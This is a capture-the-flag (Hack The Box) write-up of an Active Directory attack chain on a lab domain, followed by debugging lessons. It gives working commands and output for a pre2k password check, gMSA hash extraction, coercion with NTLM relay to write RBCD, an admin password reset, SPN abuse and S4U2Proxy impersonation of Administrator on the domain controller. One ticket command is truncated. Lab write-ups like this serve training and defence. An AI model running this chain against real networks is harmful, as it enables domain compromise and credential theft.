02

Pre2k Attack — Cracking Legacy Machine Account Passwords

Pre-Windows2000-compatible machine accounts default their password to the lowercase hostname. This is a real, still-common misconfiguration.

Setup:

git clone https://github.com/garrettfoster13/pre2k.git
cd pre2k
python3 -m pip install . --break-system-packages
python3 -m pre2k auth -u pentest -p 'p3nt3st2025!&' -d pirate.htb -dc-ip <TARGET_IP>
[04:52:03] INFO  VALID CREDENTIALS: pirate.htb\EXCH01$:exch01
[04:52:03] INFO  VALID CREDENTIALS: pirate.htb\MS01$:ms01

MS01$:ms01 confirmed — hostname-as-password. This account turned out to be a member of Domain Secure Servers.

Using MS01$ to Read gMSA Hashes

impacket-getTGT pirate.htb/'MS01$':'ms01' -dc-ip <TARGET_IP>
export KRB5CCNAME=/home/burrito/'MS01$.ccache'
netexec ldap <TARGET_IP> -u 'MS01$' -p 'ms01' -d pirate.htb --gmsa -k
LDAPS  <TARGET_IP>  636  DC01  [+] pirate.htb\MS01$:ms01
LDAPS  <TARGET_IP>  636  DC01  Account: gMSA_ADCS_prod$  NTLM: <GMSA_ADCS_NT_HASH>  PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAPS  <TARGET_IP>  636  DC01  Account: gMSA_ADFS_prod$  NTLM: <GMSA_ADFS_NT_HASH>  PrincipalsAllowedToReadPassword: Domain Secure Servers

Both gMSA NTLM hashes obtained.

The -k flag is what makes this work — the gMSA read ACL is enforced against the Kerberos session, so an NTLM-only bind (like the initial pentest attempt) never sees the hash even for a permitted account. A TGT via getTGT is mandatory first.

04

RBCD via NTLM Relay — Compromising WEB01

Goal: coerce WEB01 into authenticating to us, relay that auth to LDAPS on the DC, and grant MS01$ delegation rights over WEB01$ (Resource-Based Constrained Delegation).

Relay Listener

sudo impacket-ntlmrelayx -t ldaps://<TARGET_IP> --delegate-access --escalate-user 'MS01$' -smb2support --remove-mic
[*] Servers started, waiting for connections

Coercion

sudo apt install coercer
coercer coerce -u 'gMSA_ADCS_prod$' --hashes ':<GMSA_ADCS_NT_HASH>' -d pirate.htb -l <KALI_VPN_IP> -t <WEB01_INTERNAL_IP> --always-continue
[*] ldaps://PIRATE/WEB01$@<TARGET_IP> [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@<TARGET_IP> [1] -> MS01$ can now impersonate users on WEB01$ via S4U2Proxy

RBCD is written. MS01$ can now impersonate any user, including Administrator, on WEB01$.

Why this matteredA coercion + relay chain against LDAPS turns any account that can trigger authentication from a machine into the ability to write RBCD for another controlled principal — no direct write access to the target computer object is ever needed.

WriteSPN Abuse — Path to Domain Admin

Reset a.white_adm's Password

a.white has an admin-tier sibling account, a.white_adm, which sits in a group (IT) holding WriteSPN rights over DC01$, MS01$, and EXCH01$.

export PATH=$PATH:~/.local/bin
bloodyAD -u 'a.white' -p '<A_WHITE_PASSWORD>' -d pirate.htb --host <TARGET_IP> set password 'a.white_adm' '<NEW_ADM_PASSWORD>'
[+] Password changed successfully!

The WriteSPN Concept

servicePrincipalName (SPN) controls what Kerberos services an account is authoritative for. S4U2Proxy validates a service ticket against an initial SPN, then -altservice can rewrite the final ticket to target a different service — the KDC still signs it as valid because the original delegation chain succeeded. If we control what SPN value sits on DC01$, we can request a ticket for that SPN (impersonating Administrator via a delegation-privileged account) and rewrite it to target CIFS/DC01, effectively getting Administrator access to the DC itself.

Inspecting Existing SPNs

bloodyAD --host <TARGET_IP> -d pirate.htb -u 'a.white_adm' -p '<NEW_ADM_PASSWORD>' get object 'WEB01$' --attr servicePrincipalName
servicePrincipalName: tapinego/WEB01; tapinego/WEB01.pirate.htb; WSMAN/WEB01; WSMAN/WEB01.pirate.htb;
HOST/WEB01.pirate.htb; RestrictedKrbHost/WEB01.pirate.htb; HOST/WEB01; RestrictedKrbHost/WEB01;
TERMSRV/WEB01.pirate.htb; TERMSRV/WEB01; HTTP/WEB01; HTTP/WEB01.pirate.htb

WEB01$ already holds HTTP/WEB01. SPN values must be unique forest-wide, so this value has to be removed from WEB01$ before it can be added to DC01$.

Moving the SPN from WEB01$ to DC01$

⚠️ Pitfall encountered: bloodyAD set object <target> servicePrincipalName -v <value> operates in replace mode when the attribute already has values — passing a single -v replaces the entire attribute, not just adds one value. The first attempt at removing HTTP/WEB01 from WEB01$ used the full existing SPN list minus one value (safe), but the very first attempt at adding HTTP/WEB01 to DC01$ used a bare -v 'HTTP/WEB01' — this replaced ALL of DC01$'s SPNs, wiping its ldap/, HOST/, GC/ entries and leaving only HTTP/WEB01. This was a destructive mistake that risked breaking the DC's own Kerberos service discovery.

Recovery: since the SPN list wasn't captured beforehand and reconstructing standard DC SPNs exactly carries risk, the box was reset from the HTB panel to restore a clean state, then the SPN swap was redone carefully — this time listing WEB01's full SPN set minus HTTP/WEB01 explicitly.
bloodyAD --host <TARGET_IP> -d pirate.htb -u 'a.white_adm' -p '<NEW_ADM_PASSWORD>' set object 'WEB01$' servicePrincipalName \
  -v 'tapinego/WEB01' -v 'tapinego/WEB01.pirate.htb' -v 'WSMAN/WEB01' -v 'WSMAN/WEB01.pirate.htb' \
  -v 'HOST/WEB01.pirate.htb' -v 'RestrictedKrbHost/WEB01.pirate.htb' -v 'HOST/WEB01' \
  -v 'RestrictedKrbHost/WEB01' -v 'TERMSRV/WEB01.pirate.htb' -v 'TERMSRV/WEB01' -v 'HTTP/WEB01.pirate.htb'
[+] WEB01$'s servicePrincipalName has been updated

This freed the bare HTTP/WEB01 value (note: WEB01$ retains HTTP/WEB01.pirate.htb, the FQDN variant, which is a different SPN string).

bloodyAD --host <TARGET_IP> -d pirate.htb -u 'a.white_adm' -p '<NEW_ADM_PASSWORD>' set object 'DC01$' servicePrincipalName -v 'HTTP/WEB01'
[+] DC01$'s servicePrincipalName has been updated

S4U2Proxy with -altservice → CIFS/DC01

⚠️ Second pitfall: the first several getST attempts requested -spn 'HTTP/WEB01.pirate.htb' (the FQDN form) instead of the bare HTTP/WEB01 string actually registered on DC01$. Since SPN strings must match exactly, this silently produced a ticket bound to the wrong service identity. It authenticated fine at the Kerberos protocol level (getST reported success every time) but the resulting ticket failed downstream at the SMB session-setup stage with: 
[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy}
This error persisted identically across impacket-psexec, impacket-wmiexec, impacket-smbexec, and even netexec smb -k, across three different impacket versions (0.10.0, 0.13.1, and a clean 0.12.0 venv install) — ruling out tooling/version issues and confirming the SPN string mismatch was the actual root cause.

  -spn 'HTTP/WEB01' \
  -impersonate Administrator \
  -dc-ip <TARGET_IP> \
  -altservice 'CIFS/DC01.pirate.htb' && \
export KRB5CCNAME=/home/burrito/'Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache' && \
impacket-psexec -k -no-pass DC01.pirate.htb

08

Lessons Learned / Debugging Notes

  1. Pre2k accounts remain a real finding — hostname-lowercase passwords on legacy machine accounts are worth checking on every AD engagement.
  2. gMSA read ACLs are enforced at the Kerberos session level — an NTLM-only LDAP bind won't return a hash even for an authorized principal; a TGT via -k is mandatory first.
  3. bloodyAD set object is destructive by default — passing a single -v value replaces the entire attribute if it already has values, not adds to it. Always read and preserve the full existing value list before writing, especially on a Domain Controller object.
  4. SPN strings must match character-for-character — a getST call can report full success while still producing a ticket that silently fails downstream if the SPN doesn't exactly match what's registered on the target object.
  5. When a Kerberos-authenticated tool fails oddly, check /etc/krb5.conf first — a stale realm config from a previous target machine caused a red herring during debugging here.
  6. HTB resets wipe all AD writes and rotate gMSA passwords, but pre2k-style hostname passwords persist since they're deterministic, not randomized.
